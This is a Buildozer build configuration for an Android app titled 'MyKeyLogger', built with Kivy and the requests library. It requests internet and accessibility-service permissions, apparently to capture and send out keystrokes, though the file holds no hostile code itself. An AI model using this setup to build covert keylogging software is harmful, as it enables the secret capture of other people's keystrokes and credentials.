[app]

title = MyKeyLogger
package.name = com.behnam.keylogger
version = 1.0

source.dir = .
source.include_exts = py,png,jpg,kv,atlas

orientation = portrait
fullscreen = 1

android.permissions = INTERNET, ACCESS_NETWORK_STATE, BIND_ACCESSIBILITY_SERVICE

android.api = 33
android.minapi = 21

requirements = python3,kivy,requests

[buildozer]
log_level = 2
warn_on_root = 0